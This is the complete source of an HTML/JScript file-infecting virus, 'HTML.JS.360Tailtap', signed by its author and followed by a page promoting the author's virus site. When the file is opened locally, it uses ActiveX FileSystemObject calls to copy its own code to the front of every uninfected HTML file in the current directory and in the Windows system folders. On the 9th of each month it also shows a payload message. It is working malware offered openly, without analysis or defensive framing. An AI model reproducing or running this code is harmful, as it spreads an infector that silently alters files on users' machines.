<html><JS.360Tailtap>
<head>
<script language="JavaScript">
ThisFile = location.href;

if (ThisFile.indexOf("file:///") != -1) {
ThisFile = location.href.substr(8);

fso = new ActiveXObject("Scripting.FileSystemObject");
File = fso.GetFile(ThisFile);
Path = File.ParentFolder;
FileName = File.Name;
ReadVirus = fso.OpenTextFile(Path+"\\"+FileName, 1, false, 0);
Virus = ReadVirus.Read(1822);

InfectCurrentDir(Path);

i = 2;
while (i != -1) {
SFolder = fso.GetSpecialFolder(i);
InfectCurrentDir(SFolder);
i = i-1;
}

date = new Date();
if (date.getDate() == 9) {
alert("HTML.JS.360Tailtap Virus\ncoded by DiA (c)2oo3\n\nhttp://www.anzwers.net/free/dia");
document.write("<font size='8' color='Red' onMouseOver=\"alert('T A I L T A P')\">");
document.write("360</font>");
}
}

else {
var w = document.write;
w("<center><font size='5'>HTML.JS.360Tailtap Virus</font><br>");
w("coded by DiA (c)2oo3<br>[my 1st HTML.JS Virus]<br>");
w("WORKS ONLY IN LOCATION file:///<br><br><br>");
w("<a href='http://www.anzwers.net/free/dia'>VISIT MY SITE</a>");
}

function InfectCurrentDir(Dir) {
Folder = fso.GetFolder(Dir);
FindFile = new Enumerator(Folder.Files);
FindFile.moveFirst();

while (FindFile.atEnd() == false) {
Found = FindFile.item();
FileType = fso.GetFile(Found);
HTML = FileType.Type;

if (Found != Path+"\\"+FileName) {

if (HTML.indexOf("HTML") != -1) {
CheckInfection = fso.OpenTextFile(Found, 1, false, 0);
Marker = CheckInfection.ReadLine();

if (Marker.indexOf("<JS.360Tailtap>") == -1) {
ReadHost = fso.OpenTextFile(Found, 1, false, 0);
Host = ReadHost.ReadAll();

fso.CreateTextFile(Found);
Prepend = fso.OpenTextFile(Found, 2, false, 0);
Prepend.Write(Virus+Host);
Prepend.Close();
}
}
}
FindFile.moveNext();
}
}
</script>
</head>
</html><html>
<head>
<title>HTML.JS.360Tailtap</title>
</head>
<body>
<center>
<font size="8">360Tailtap Virus</font><br>
coded by DiA (c)2oo3<br>
<b>[my 1st HTML.JS Virus]</b><br><br>
<a href="http://www.anzwers.net/free/dia">-Visit my Site to see other Virus stuff-</a>
</center>
</body>
</html>